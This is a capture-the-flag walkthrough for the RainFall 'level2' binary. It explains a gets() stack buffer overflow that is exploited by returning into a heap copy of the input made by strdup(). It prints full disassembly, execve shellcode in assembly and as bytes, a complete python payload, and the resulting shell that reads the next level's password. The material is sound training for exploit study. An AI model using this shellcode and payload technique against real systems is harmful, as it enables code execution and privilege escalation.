# level2 - Stack Buffer Overflow - Heap Exploit

On `level2`'s HOME, we find a binary named : `level2`

```shell
...
0x080484d4  p
0x0804853f  main
...
```

We find two interesting function in this binary : `main()` and `run()`.
let's disassemble these functions:

```shell
(gdb) disass main
Dump of assembler code for function main:
   0x0804853f <+0>:	push   ebp
   0x08048540 <+1>:	mov    ebp,esp
   0x08048542 <+3>:	and    esp,0xfffffff0
   0x08048545 <+6>:	call   0x80484d4 <p>
   0x0804854a <+11>:	leave
   0x0804854b <+12>:	ret
End of assembler dump.
(gdb) disass p
Dump of assembler code for function p:
   0x080484d4 <+0>:	push   ebp
   0x080484d5 <+1>:	mov    ebp,esp
   0x080484d7 <+3>:	sub    esp,0x68
   0x080484da <+6>:	mov    eax,ds:0x8049860
   0x080484df <+11>:	mov    DWORD PTR [esp],eax
   0x080484e2 <+14>:	call   0x80483b0 <fflush@plt>
   0x080484e7 <+19>:	lea    eax,[ebp-0x4c]
   0x080484ea <+22>:	mov    DWORD PTR [esp],eax
   0x080484ed <+25>:	call   0x80483c0 <gets@plt>
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
   0x08048527 <+83>:	lea    eax,[ebp-0x4c]
   0x0804852a <+86>:	mov    DWORD PTR [esp],eax
   0x0804852d <+89>:	call   0x80483f0 <puts@plt>
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
End of assembler dump.
```

As we see in the function `p`, a buffer of 76 is allocate on the stack of and
passed as argument to `gets()`. The function `gets()` read on stdin and don't check
if the input buffer is big enough to hold the string. There are here a simple
BOF, and we can rewrite `eip` to an other function ...

<br>

But this snippet challenges us:
```shell
...
   0x080484f2 <+30>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484f5 <+33>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484f8 <+36>:	mov    eax,DWORD PTR [ebp-0xc]
   0x080484fb <+39>:	and    eax,0xb0000000
   0x08048500 <+44>:	cmp    eax,0xb0000000
   0x08048505 <+49>:	jne    0x8048527 <p+83>
   0x08048507 <+51>:	mov    eax,0x8048620
   0x0804850c <+56>:	mov    edx,DWORD PTR [ebp-0xc]
   0x0804850f <+59>:	mov    DWORD PTR [esp+0x4],edx
   0x08048513 <+63>:	mov    DWORD PTR [esp],eax
   0x08048516 <+66>:	call   0x80483a0 <printf@plt>
   0x0804851b <+71>:	mov    DWORD PTR [esp],0x1
   0x08048522 <+78>:	call   0x80483d0 <_exit@plt>
... 
```

this means that if the rewrite address of `eip` begin by a `b`, the execution
will `exit()`. And indeed, all stack address are begin by `b` so we must find
an over place to redirect the execution.

<br>

To do that, this over snippet will help us:
```shell
   0x08048532 <+94>:	lea    eax,[ebp-0x4c]
   0x08048535 <+97>:	mov    DWORD PTR [esp],eax
   0x08048538 <+100>:	call   0x80483e0 <strdup@plt>
   0x0804853d <+105>:	leave
   0x0804853e <+106>:	ret
```

Perfect, our craft payload (with potential shellcode) will be upload in the heap
(`malloc()`) using `strdup()`. Let's check the return of this function:

```shell
level2@RainFall:~$ ltrace ./level2
__libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
fflush(0xb7fd1a20)                                              = 0
gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5)                   = 0xbffff6fc
puts("")                                                        = 1
strdup("")                                                      = 0x0804a008
+++ exited (status 8) +++
```

We know now on which address redirect our execution: `0x0804a008`.

<br>

So there is an offset of 76 bytes before `ebp`. This knowing, we just have to
rewrite `eip` to point to an emplacement on the buffer upload on the heap 
where is our crafted shellcode.

<br>

This is our crafted shellcode (on our machine) from this snippet:
```shell
execve('/bin//sh')
```

```shell
>$ cat /tmp/exploit2.s
global _start

section .text
_start:
    xor eax, eax        ; set eax to 0
    xor ecx, ecx        ; value to NULL to prevent misbehavior
    xor edx, edx        ; value to NULL to prevent misbehavior
    mov al, 11          ; execve syscall number
    push edx            ; push NULL string terminator
    mov ebx, '//sh'     ; first arg to /sh
    push ebx            ; push to stack
    mov ebx, '/bin'     ; first arg to /bin/sh
    push ebx            ; push to stack
    mov ebx, esp        ; move pointer to '/bin//sh'
    int    0x80         ; syscall
```

After compile it, let's extract the shellcode (on our machine):
```shell
(cd /tmp && nasm -f elf exploit2.s && ld -m elf_i386 -o exploit2 exploit2.o)
count=0; for i in $(objdump -d /tmp/exploit2 |grep "^ " |cut -f2); do echo -n "\x$i"; count=$((count + 1)); done; echo; echo "$count bytes"
```

We get now our shellcode in well form with his length:
```shell
[SNIP]
\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80
25 bytes
```

<br>

To summary, we have:
- An offset of **80 bytes** before `eip`
- A shellcode with a length of **25 bytes**
- The new address of `eip` : **0x0804a008**

<br>

So our payload (using python) will be:
- Our shellcode -> `\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80`
- NOP instruction -> `\x90` * 55
- New `eip` address : `\x08\x04\xa0\x08`

<br>


We can now exploit this BOF :

```shell
(python -c "print '\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80' + '\x90'*55 + '\x08\x04\xa0\x08'[::-1]"; cat) | ./level2
```

```shell
level2@RainFall:~$ (python -c "print '\x31\xc0\x31\xc9\x31\xd2\xb0\x0b\x52\xbb\x2f\x2f\x73\x68\x53\xbb\x2f\x62\x69\x6e\x53\x89\xe3\xcd\x80' + '\x90'*55 + '\x08\x04\xa0\x08'[::-1]"; cat) | ./level2
1�1Ұ
    R�//shS�/binS��RS��̀������������������������������������������������
id
uid=2021(level2) gid=2021(level2) euid=2022(level3) egid=100(users) groups=2022(level3),100(users),2021(level2)
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```
